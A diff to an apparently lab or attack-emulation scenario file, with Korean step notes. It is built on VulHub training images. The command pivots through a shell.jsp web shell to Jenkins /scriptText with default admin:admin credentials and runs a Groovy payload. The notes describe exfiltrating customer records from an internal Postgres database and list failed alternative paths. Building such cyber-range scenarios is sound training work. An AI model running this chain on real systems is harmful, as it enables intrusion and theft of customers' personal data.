@@ -11,7 +11,7 @@
     "steps": [
       {"id": "STEP-corp-crown-pii", "seq": 1,
        "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20-u%20admin%3Aadmin%20--data-urlencode%20%27script%3Devaluate%28new%20File%28%22%2Fopt%2Fpayload%2Fcrown-read.groovy%22%29.text%29%27%20http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2FscriptText'",
-       "description": "★ 유일 경로 — shell.jsp(dmz) → Jenkins /scriptText(internal) → evaluate(/opt/payload/crown-read.groovy) → corp-crown/postgres JDBC → customers 반출. ★ 실패 경로(쓰지 말 것): shell.jsp 안에서 직접 psql — Tomcat 컨테이너에 psql 미설치 + ext/dmz→crown TCP 는 NetworkPolicy 로 차단 (연결 타임아웃). ★ 인증 필수: `-u admin:admin` (VulHub 공식 교육 이미지 기본 자격증명). ★ 응답 형식: `CROWN_COLS:<컬럼명 콤마>` 한 줄 + `CROWN_ROW:<값|값|...>` 10줄. 이 응답이 T1213 크라운 반출의 산출물."}
+       "description": "★★★ 유일 경로 — shell.jsp(dmz) → Jenkins /scriptText(internal) → evaluate(/opt/payload/crown-read.groovy) → corp-crown/postgres JDBC → customers 반출. ★ 실패 경로(쓰지 말 것): (a) ext 또는 dmz 발판에서 직접 psql — ext/dmz→crown TCP 는 NetworkPolicy 로 차단 (연결 타임아웃). (b) postgres:postgres 등 디폴트 자격증명 — crown PostgreSQL 자격증명이 랜덤화되어 추측 불가능 (corp_svc:<16자 랜덤>). ★★ crown-read.groovy 는 /opt/deploy/corp-db.properties 에서 자격증명을 자동 로드 — 공격자는 자격증명 값을 몰라도 evaluate 하기만 하면 됨 (Jenkins Pod 안 ConfigMap 마운트가 자격증명 수집·crown 접속을 하나의 호출로 묶음). ★ 인증 필수: `-u admin:admin` (VulHub 공식 교육 이미지 기본 Jenkins 자격증명). ★ 응답 형식: `CROWN_COLS:<컬럼명 콤마>` 한 줄 + `CROWN_ROW:<값|값|...>` 10줄. 이 응답이 T1213 크라운 반출의 산출물."}
     ]
   },
   "preconditions": [
